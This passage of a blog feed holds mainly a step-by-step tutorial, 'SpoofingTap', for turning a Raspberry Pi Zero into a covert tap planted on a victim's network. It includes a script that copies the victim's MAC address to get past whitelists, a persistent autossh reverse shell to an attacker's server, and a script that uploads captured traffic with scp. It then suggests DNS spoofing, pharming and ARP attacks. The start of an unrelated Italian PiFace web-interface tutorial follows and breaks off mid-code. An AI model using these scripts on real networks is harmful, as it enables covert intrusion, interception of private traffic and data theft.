Costanzo</name></author><category term="Guides" /><category term="InternetofThings" /><category term="IoT" /><category term="piface" /><category term="piface digital 2" /><category term="pifaceio" /><category term="Programmazione" /><category term="Python" /><category term="raspberry" /><category term="raspberrypi" /><summary type="html"></summary></entry><entry><title type="html">SpoofingTap - a network tap with automatic MAC address spoofing</title><link href="http://localhost:4000/spoofingtap" rel="alternate" type="text/html" title="SpoofingTap - a network tap with automatic MAC address spoofing" /><published>2017-02-21T00:00:00+01:00</published><updated>2017-02-21T00:00:00+01:00</updated><id>http://localhost:4000/spoofingtap</id><content type="html" xml:base="http://localhost:4000/spoofingtap">&lt;p&gt;In this article we will see how to implement, starting from a Raspberry Pi Zero, a particular network tap that takes the same victim machine’s Internet connection to open a reverse shell and realize various MITM attacks.&lt;/p&gt;
+
+&lt;p&gt;Create a network tap on a Linux machine is quite simple; you only need two Ethernet interfaces and configure a virtual bridge between them. This type of tap network is very interesting because, as I mentioned earlier, is able to use the same victim’s network to connect to the Internet. You could, for example, use the connection to send to a remote server a copy of traffic captured with tcpdump. A simple example made on Raspberry Pi and available online, is &lt;a href=&quot;https://github.com/botherder/ntap&quot;&gt;NTap&lt;/a&gt;.&lt;/p&gt;
+
+&lt;figure&gt;
+&lt;img data-width=&quot;1291&quot; data-height=&quot;479&quot; src=&quot;assets/posts/spoofingtap1.jpg&quot; /&gt;  
+&lt;/figure&gt;
+
+&lt;p&gt;However, in some network infrastructures with specific security policies (eg. in a company), often MAC address whitelists are defined to allow access only to authorized machines. In these circumstances, a network tap made with a virtual bridge, continue to provide to the victim machine network access, but would not be able to connect to the same, as it occurs in the network with a MAC address not recognized. The only way to access the network, is to spoof the MAC address of the victim, which is present in the whitelist.&lt;/p&gt;
+
+&lt;figure&gt;
+&lt;img data-width=&quot;1291&quot; data-height=&quot;479&quot; src=&quot;assets/posts/spoofingtap2.png&quot; /&gt;  
+&lt;/figure&gt;
+
+&lt;p&gt;SpoofingTap is based on this idea, and it was made on a Raspberry Pi Zero for several reasons:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;small size and portability&lt;/li&gt;
+  &lt;li&gt;low power consumption&lt;/li&gt;
+  &lt;li&gt;affordable cost ($5 for the only board)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The Pi Zero however has no network interfaces then, in addition to a microSD where to install the OS, you need two Ethernet network adapters. In this regard we have some alternatives:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Use a USB Ethernet Hub, which will be connected in cascade a second Ethernet USB adapter.&lt;/li&gt;
+  &lt;li&gt;Use a Micro-USB Ethernet adapter and take advantage of the GPIO interface to connect a second Ethernet controller chip based on the economic enc28j60 (PiJack). This solution has the advantage of having a more compact device, however, it limits the connection speed to 10Mbps.&lt;/li&gt;
+  &lt;li&gt;Use a slightly more expensive Ethernet + USB shield (available here), to which we will add a second USB Ethernet adapter. This latter alternative, although has a higher cost, is to be considered the best; in fact it allows us to make the device more compact and at the same time to maintain a 100Mbps link speed.
+&lt;em&gt;(I got to get in touch with the person that produces the shield, to test the feasibility of a version with two Ethernet ports 100Mbps. The change is possible however, for reasons of cost, the producer would be willing to implement it only if there will be a good number of requests.)&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;figure&gt;
+&lt;img data-width=&quot;1291&quot; data-height=&quot;479&quot; src=&quot;assets/posts/spoofingtap3.png&quot; /&gt;  
+&lt;/figure&gt;
+
+&lt;p&gt;Once you’ve connected the two network interfaces, which we call the &lt;b&gt;eth0&lt;/b&gt; and &lt;b&gt;eth1&lt;/b&gt;, you must configure the operating system (Raspbian in our case).&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;b&gt;STEP 1&lt;/b&gt;. Configure the network interfaces by editing the file &lt;em&gt;/etc/network/interfaces&lt;/em&gt; as follows:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;auto eth0
+allow-hotplug eth0
+iface eth0 inet static
+        address 1.0.0.1
+        netmask 255.255.255.0
+
+auto eth1
+allow-hotplug eth0
+iface eth0 inet manual
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The interface eth0 is configured with a static ip address that will be seen by the victim machine as a gateway. The interface eth1 will instead be the one connected to the external network.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;b&gt;STEP 2&lt;/b&gt;. We define the iptables rules to forward traffic from the interface eth0 to eth1 and enable ip forwarding on the system.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Set rules in iptables
+sudo iptables -A FORWARD -o eth1 -i eth0 -s 1.0.0.0/24 -m conntrack --ctstate NEW -j ACCEPT
+sudo iptables -A FORWARD -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
+sudo iptables -t nat -F POSTROUTING
+sudo iptables -t nat -A POSTROUTING -o eth1 -j MASQUERADE
+
+# Save iptables rules
+sudo iptables-save &amp;gt; /etc/iptables.sav
+
+# Edit /etc/sysctl.conf and uncomment:
+net.ipv4.ip_forward=1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;b&gt;STEP 3&lt;/b&gt;. We configure dnsmasq to assign an IP address to the victim machine when it is connected to the eth0 port on tap.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# DHCP/DNS server
+sudo apt-get install dnsmasq
+sudo /etc/init.d/dnsmasq stop
+
+#backup of default conf
+sudo cp /etc/dnsmasq.conf /etc/dnsmasq.conf-backup
+
+# Edit /etc/dnsmasq.conf and add the following two lines:
+interface=eth0
+dhcp-range=1.0.0.2,1.0.0.50,72h
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;b&gt;STEP 4&lt;/b&gt;. Add the following commands to /etc/rc.local to run at system boot.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Edit /etc/rc.local and add the following lines before the &quot;exit 0&quot; line:
+iptables-restore &amp;lt; /etc/iptables.sav
+/etc/init.d/dnsmasq start
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;b&gt;STEP 5&lt;/b&gt;. Configure the script for automatic spoofing MAC address of the victim. So, the interface eth1 will occur on the network with the MAC address of the victim.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Install ifplugstatus to get status of ethernet devices
+sudo apt-get install ifplugd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;We create the file /etc/spoofing_script.sh with the following contents:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# When Pi Zero starts, eth0 must be connected to the victim's machine&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# eth1 must be connected to the router/external network&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Steal the MAC address of victim's machine connected to eth0&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;MAC_ADDR&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;arp &lt;span class=&quot;nt&quot;&gt;-an&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 4&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$MAC_ADDR&lt;/span&gt; | egrep &lt;span class=&quot;s2&quot;&gt;&quot;^([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2}$&quot;&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
+	&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;MAC_ADDR&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;arp &lt;span class=&quot;nt&quot;&gt;-an&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 4&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;done
+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; MAC address copied: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$MAC_ADDR&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+
+
+&lt;span class=&quot;c&quot;&gt;# Spoof the MAC address copied on eth1 interface&lt;/span&gt;
+ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev eth1 down
+ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev eth1 address &lt;span class=&quot;nv&quot;&gt;$MAC_ADDR&lt;/span&gt;
+ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev eth1 up
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; MAC address spoofed: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$MAC_ADDR&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# LED flashing signaling the end of spoofing operation&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0
+&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$counter&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-lt&lt;/span&gt; 4 &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
+        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;1 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /sys/class/leds/led0/brightness
+        &lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;0.2
+        &lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;0 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /sys/class/leds/led0/brightness
+        &lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;0.2
+        &lt;span class=&quot;nv&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;expr&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$counter&lt;/span&gt; + 1&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Give execute permission to the script you just created and add it to /etc/rc.local  to run at boot.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#add execution permission
+sudo chmod +x /etc/spoofing_script.sh
+
+# Edit /etc/rc.local and add the following lines before the &quot;exit 0&quot; line:
+/bin/sh /etc/spoofing_script.sh &amp;gt;&amp;gt; /home/pi/log_spoofing.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;b&gt;STEP 6&lt;/b&gt;. We configure the tap for the automatic opening of a persistent reverse shell. You will need to have a remote server running with SSH service listening on port 2222 (in this way we make sure not to use a filtered reserved port).&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Install Autossh
+sudo apt-get install autossh
+	
+# Get a shell as root
+sudo su
+
+# Execute ssh-keygen command
+ssh-keygen
+
+# Enter the path when requested and leave empty passphrase (output sample below)
+Generating public/private rsa key pair.
+Enter file in which to save the key (/root/.ssh/id_rsa): */root/.ssh/nopwd*
+Enter passphrase (empty for no passphrase): *leave empty*
+Enter same passphrase again: *leave empty*
+
+# Copy the generated public key on your middleman server (replace &quot;user&quot; and &quot;middleman_server&quot; with your username and middleman ssh server)
+ssh-copy-id -i .ssh/nopwd.pub -p 2222 user@middleman_server
+
+#Edit /etc/rc.local and add the following line before the &quot;exit 0&quot; line (replace &quot;user&quot; and &quot;middleman_server&quot; with your username and middleman ssh server):
+autossh -M 10984 -N -f -o &quot;PubkeyAuthentication=yes&quot; -o &quot;PasswordAuthentication=no&quot; -i /root/.ssh/nopwd -R 6666:localhost:22 user@middleman_server -p 2222 &amp;amp;
+
+# Reboot the system
+reboot -h now
+
+# Execute this command on your middleman_server to test
+ssh -p 6666 pi@127.0.0.1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;b&gt;STEP 7&lt;/b&gt;. We can set up a script that automatically send to our remote server a signed copy of the traffic captured with tcpdump. The signature assures us integrity, authenticity and non-repudiation of the captured traffic.&lt;/p&gt;
+
+&lt;p&gt;First, we generate the keys and install necessary tools:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#Key generation
+sudo openssl req -nodes -x509 -sha256 -newkey rsa:4096 -keyout &quot;SpoofingTap.key&quot; -out &quot;SpoofingTap.crt&quot; -days 365 -subj &quot;/C=IT/ST=Italia/L=Napoli/O=Private/OU=IT Dept/CN=SpoofingTap&quot;
+
+#Subsequent verification of the file signed with the key
+openssl dgst -sha256 -verify  &amp;lt;(openssl x509 -in &quot;SpoofingTap.crt&quot;  -pubkey -noout) -signature dump.pcap.sha256 dump.pcap
+
+#install tcpdump and inotify-tools
+sudo apt-get install tcpdump inotify-tools
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then we define the script to automatically upload captured traffic on the server. Create the file /etc/mirroring.sh with the following content:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; /tmp/dumps
+&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; /tmp/checksums
+
+&lt;span class=&quot;nv&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;#Listener for new dump files &lt;/span&gt;
+inotifywait &lt;span class=&quot;nt&quot;&gt;--format&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%f'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; create &lt;span class=&quot;s2&quot;&gt;&quot;/tmp/dumps&quot;&lt;/span&gt; | &lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;f
+
+&lt;span class=&quot;k&quot;&gt;do
+        if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
+                &lt;span class=&quot;c&quot;&gt;#sign the new dump file&lt;/span&gt;
+                openssl dgst &lt;span class=&quot;nt&quot;&gt;-sha256&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sign&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/home/pi/SpoofingTap.key&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-out&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/tmp/checksums/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.sha256&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/tmp/dumps/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+                
+                &lt;span class=&quot;c&quot;&gt;#Upload on the server of file dump and its sign&lt;/span&gt;
+                scp &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; 2222 &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; /root/.ssh/nopwd &lt;span class=&quot;s2&quot;&gt;&quot;/tmp/checksums/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.sha256&quot;&lt;/span&gt; user@middlemad_server:/home/user/checksums &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
+                scp &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; 2222 &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; /root/.ssh/nopwd &lt;span class=&quot;s2&quot;&gt;&quot;/tmp/dumps/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; user@middleman_server:/home/user/dumps &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
+                
+                &lt;span class=&quot;c&quot;&gt;#Delete file on Raspberry’s disk&lt;/span&gt;
+                &lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/tmp/checksums/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.sha256&quot;&lt;/span&gt;
+                &lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/tmp/dumps/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;fi
+        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$f&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt; &amp;amp;
+
+&lt;span class=&quot;c&quot;&gt;#start tcpdump with log rotate every 10 seconds&lt;/span&gt;
+tcpdump &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 0 &lt;span class=&quot;nt&quot;&gt;-G&lt;/span&gt; 10 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/tmp/dumps/trace_%Y-%m-%d_%H:%M:%S.pcap'&lt;/span&gt; &amp;amp;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Add execute permissions and put the script in /etc/rc.local to run at boot:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#add execution permission
+sudo chmod +x /etc/mirroring.sh
+
+#Edit /etc/rc.local and add the following lines before the &quot;exit 0&quot; line:
+/bin/sh /etc/mirroring.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;At this point we have our tap accessible via SSH remotely, and from which we will be able to launch various MITM attacks such as sniffing, DNS spoofing, pharming, etc. In addition, having remote access to the internal network, you can also perform network scans, ARP spoofing attacks, and much more.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;b&gt;&lt;em&gt;Note&lt;/em&gt;&lt;/b&gt;: Unlike the network tap made with virtual bridge, this will no longer be transparent. In fact, by doing a traceroute from the inside, you will see that the traffic passes through an additional node, which is our gateway. However, from the outside will not be detectable because the tap comes up with the same MAC address of the victim machine.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;</content><author><name>Giovanni De Costanzo</name></author><category term="Guides" /><category term="InternetofThings" /><category term="man-in-the-middle" /><category term="MITM" /><category term="networking" /><category term="networktap" /><category term="Raspberry" /><category term="spoofing" /><category term="SpoofingTap" /><category term="tcpdump" /><summary type="html">In this article we will see how to implement, starting from a Raspberry Pi Zero, a particular network tap that takes the same victim machine’s Internet connection to open a reverse shell and realize various MITM attacks.</summary></entry><entry><title type="html">PiFace Digital 2 - Creare una Web interface in PHP</title><link href="http://localhost:4000/PiFace-Web" rel="alternate" type="text/html" title="PiFace Digital 2 - Creare una Web interface in PHP" /><published>2016-08-30T00:00:00+02:00</published><updated>2016-08-30T00:00:00+02:00</updated><id>http://localhost:4000/PiFace-Web</id><content type="html" xml:base="http://localhost:4000/PiFace-Web">&lt;figure&gt;
+
+&lt;img data-width=&quot;1291&quot; data-height=&quot;479&quot; src=&quot;assets/posts/pifacedigital2.jpg&quot; /&gt;  
+&lt;/figure&gt;
+
+&lt;p&gt;In questo nuovo articolo vedremo come mettere in comunicazione il nostro programma in Python realizzato per la gestione della scheda PiFace con una interfaccia Web, utilizzando PHP.&lt;/p&gt;
+
+&lt;p&gt;Per poter mettere in comunicazione il programma scritto in Python con uno script PHP, creeremo delle connessioni socket per lo scambio di messaggi. In particolare, il seguente programma Python fungerà da server, e verrà messo in ascolto sulla porta 9000, in attesa di nuove connessioni client da parte di uno script PHP. Quando viene instaurata una nuova connessione, l’oggetto conn viene passato ad un nuovo thread che, in base al comando ricevuto dal client (nel nostro caso ‘0’, ‘1’ oppure ‘2’), restituisce lo stato della porta di input 0 oppure attiva e disattiva la porta di output 0 (accendendo e spegnendo quindi anche il relativo led).&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import socket
+import sys
+import pifaceio
+from thread import *
+
+#---- piaceio read and write functions ------ 
+pfio = pifaceio.PiFace()
+
+def read_pin(pin):
+   pfio.read()
+   return pfio.read_pin(pin)
+
+def write_pin(pin, state):
+   pfio.write_pin(pin, state)
+   pfio.write()
+ 
+
+#---- Socket creation -------
+HOST = '' # Symbolic name meaning all available interfaces
+PORT = 9000 # Arbitrary non-privileged port
+ 
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+print 'Socket created'
+
+try:
+   s.bind((HOST, PORT))
+except socket.error as msg:
+   print 'Bind failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
+   sys.exit()
+ 
+print 'Socket bind complete'
+ 
+s.listen(10)
+print 'Socket now listening'
+ 
+
+
+#---- Function for handling connections. ------
+#---- This will be used to create threads -----
+def clientthread(conn):
+ 
+   command = conn.recv(1) #Receive 1 Bytes
+   if command == '0': #Return the state of input port 0
+      if read_pin(0):
+         conn.send('1')
+      else:
+         conn.send('0')
+ 
+   elif command == '1':
+      write_pin(0,0)
+      conn.send('0')
+ 
+   elif command == '2':
+      write_pin(0,1)
+      conn.send('0') 
+
+   #came out of loop
+   conn.close()
+ 
+
+#--- Now waiting for a client connection -----
+while 1:
+   #wait to accept a connection - blocking call
+   conn, addr = s.accept()
+   print 'Connected with ' + addr[0] + ':' + str(addr[1])
+ 
+   #start new thread takes 1st argument as a function name to be run 
+   #second is the tuple of arguments to the function.
+   start_new_thread(clientthread ,(conn,))
+ 
+s.close()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Di seguito invece è mostrato lo script PHP utilizzato come client il quale, invocato tramite una chiamata AJAX da interfaccia Web, riceve come parametro GET il comando da inviare, si collega al server e invia il comando; resta quindi in attesa di una risposta che sarà poi stampata prima di terminare.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$host&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;localhost&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$cmd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
